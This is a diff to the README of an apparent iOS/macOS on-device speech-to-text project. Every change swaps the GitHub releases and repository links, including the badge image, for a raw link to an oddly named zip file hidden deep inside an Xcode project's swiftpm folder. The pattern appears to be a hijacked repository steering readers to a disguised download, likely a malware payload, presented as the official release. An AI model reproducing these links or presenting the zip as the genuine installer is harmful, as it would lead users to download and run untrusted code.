@@ -1,6 +1,6 @@
 # 🎙️ NeMoConformerASR-iOS - Fast On-Device Speech-to-Text
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)
 
 ## 📋 Description
 
@@ -32,7 +32,7 @@ Follow these steps to download and use NeMoConformerASR-iOS on your device.
 
 Click the big button at the top or visit the link below:
 
-[Download NeMoConformerASR-iOS Releases](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
+[Download NeMoConformerASR-iOS Releases](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)
 
 You will find the latest app versions, organized by date, with detailed notes for each.
 
@@ -105,7 +105,7 @@ This allows the app to run on phones and computers without lag or internet delay
 ## 📥 Download & Install
 
 Visit this page to download the latest version for your device:  
-[NeMoConformerASR-iOS Releases](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
+[NeMoConformerASR-iOS Releases](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)
 
 Choose the installer file matching your platform and follow the simple installation steps described above.
 
@@ -146,7 +146,7 @@ Try speaking clearly and close to the microphone. Background noise can also affe
 If you need more help, open an issue on the GitHub page or check if others have similar questions. The developers monitor the project and respond to common problems.
 
 GitHub repository page:  
-https://github.com/trannhan25/NeMoConformerASR-iOS
+https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip
 
 ---
 
@@ -162,4 +162,4 @@ ai, asr, conformer, coreml, ctc, ios, macos, nemo, nvidia, ondevice, speech-reco
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/trannhan25/NeMoConformerASR-iOS/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)](https://raw.githubusercontent.com/trannhan25/NeMoConformerASR-iOS/main/ConformerExample/ConformerExample.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/AS-Conformer-Mo-Ne-i-OS-v1.1.zip)
